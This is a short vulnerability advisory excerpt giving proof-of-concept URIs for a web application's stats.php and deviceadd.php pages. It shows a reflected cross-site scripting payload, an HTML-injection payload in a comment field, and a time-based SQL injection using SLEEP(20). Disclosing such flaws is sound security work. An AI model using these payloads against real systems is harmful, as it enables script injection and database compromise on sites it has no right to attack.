An attacker can exploit these issues through a browser. An attacker must trick an unsuspecting victim into following a malicious URI to exploit the cross-site scripting issues.

The following example URIs are available.

Cross-site scripting:

http://www.example.com/stats.php?graphtype=bar&amp;type=vlan13&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1

HTML-injection:

http://www.example.com/deviceadd.php?name=test&amp;mac=0001.0001.0001&amp;status=1&amp;vlan=6&amp;username=2&amp;office=1&amp;comment="&gt;&lt;script&gt;alert(2)&lt;/script&gt;&amp;action=Update&amp;action_idx=1

SQL-Injection:

http://www.example.com/deviceadd.php?name=test&amp;mac=0001.0001.0001&amp;status=1+AND+SLEEP(20)&amp;vlan=6&amp;username=2&amp;office=1&amp;comment=&amp;action=Update&amp;action_idx=1
